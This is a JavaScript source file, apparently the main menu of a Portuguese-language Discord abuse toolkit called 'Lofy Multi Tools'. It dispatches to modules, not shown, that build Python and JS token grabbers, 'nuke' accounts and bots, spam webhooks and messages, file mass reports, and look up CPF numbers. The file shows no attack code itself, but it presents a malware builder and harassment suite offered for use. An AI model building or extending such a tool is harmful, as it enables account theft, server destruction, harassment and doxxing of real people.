const lets_go = () => {
    process.title = "Lofy Multi Tools"
    const c = require('ansi-colors'),
        readline = require("readline").createInterface({
            input: process.stdin,
            output: process.stdout
        })
    json = require("./Arquivos Config/config.json")
    log = console.log,
        cls = console.clear
    cls()

    log(c.magenta(`\n\n
   ██╗      ██████╗ ███████╗██╗   ██╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
   ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
   ██║     ██║   ██║█████╗   ╚████╔╝    ██║   ██║   ██║██║   ██║██║     ███████╗
   ██║     ██║   ██║██╔══╝    ╚██╔╝     ██║   ██║   ██║██║   ██║██║     ╚════██║
   ███████╗╚██████╔╝██║        ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚══════╝ ╚═════╝ ╚═╝        ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                ${c.yellow("Sistema de Atualização em andamento")}\n\n\n`))

    const off = c.red("[OFF]")
    const on = c.green("[ON]")

    console.log(c.yellow(`
   [01] BOT DE DIVULGAÇÃO ${on}        [08] WEBHOOK SPAWN ${on}
   [02] DIVULGAÇÃO POR CONTA ${on}     [09] DELETAR UMA WEBHOOK ${on}
   [03] LIMPAR MENSAGEM ${on}          [10] CRIAR UM GRABBER EM .PY ${on}
   [04] CLONAR UM SERVIDOR ${on}       [11] DENÚNCIA EM MASSA ${on}
   [05] NUKER EM CONTA ${on}           [12] DERRUBAR UM TOKEN ${off}
   [06] NUKER EM BOT ${on}             [13] CONSULTAR UM CPF ${off}
   [07] TOKEN CHECKER ${on}            [14] CONSULTAR UM CNPJ ${on}
   [0] Sair                           [15] CRIAR UM TOKEN GRABBER EM .JS ${on}
                                      [16] CONSULTAR UM CEP ${on}\n\n\n
`))

    readline.question(c.yellow("   [?] Escolha uma opção: "), answer => {

        switch (answer) {

            case "0":
                process.exit()
                break;

            case "1":
                readline.close()
                require('./Api/bot-div').self(lets_go)
                break;

            case "2":
                readline.close()
                require('./Api/user-div').self(lets_go)
                break;

            case "3":
                readline.close()
                require('./Api/limpador').self(lets_go)
                break;

            case "4":
                readline.close()
                require('./Api/cloner').self(lets_go)
                break;

            case "5":
                readline.close()
                require('./Api/user-nuker').self(lets_go)
                break;

            case "6":
                readline.close()
                require('./Api/bot-nuker').self(lets_go)
                break;

            case "7":
                readline.close()
                require('./Api/token-checker').self(lets_go)
                break;

            case "8":
                readline.close()
                require('./Api/webhook-Spawn').self(lets_go)
                break;

            case "9":
                readline.close()
                require('./Api/webhook-dell').self(lets_go)
                break;

            case "10":
                readline.close()
                require('./Api/py-grabber').self(lets_go)
                break;

            case "11":
                readline.close()
                require('./Api/denuncia').self(lets_go)
                break;

            case "12":
                readline.close()
                require('./Api/dell-token').self(lets_go)
                break;

            case "13":
                readline.close()
                require('./Api/cpf').self(lets_go)
                break;

            case "14":
                readline.close()
                require('./Api/cnpj').self(lets_go)
                break;

            case "15":
                readline.close()
                require('./Api/js-grabber').self(lets_go)
                break;

            case "16":
                readline.close()
                require('./Api/cep').self(lets_go)
                break;

        }

    })

}

lets_go()

module.exports.painel = function (a) {
    lets_go()
}